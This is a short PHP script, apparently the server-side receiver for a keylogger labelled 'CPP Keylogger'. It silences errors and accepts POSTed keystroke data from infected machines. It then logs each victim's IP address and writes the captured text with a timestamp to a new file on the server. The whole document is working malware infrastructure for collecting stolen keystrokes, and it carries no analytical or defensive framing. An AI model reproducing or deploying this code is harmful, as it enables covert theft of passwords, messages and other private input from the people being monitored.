<?php
error_reporting(0);

if (!isset($_POST["ip"])) {
	if (isset($_SERVER['REMOTE_ADDR'])) {
		$ip = $_SERVER['REMOTE_ADDR'];
	} else if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
		$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
	} else {
		$ip = "unknown";
	}
} else {
	$ip = $_POST["ip"];
}

$data = $_POST["data"];
$time = date('m/d/Y h:i:s a', time());

$real_message = "[CPP Keylogger]\ndata : {$data}\ntime : {$time}\nip : {$ip}";

fwrite(fopen(time() . ".txt", "w"), $real_message);

die();
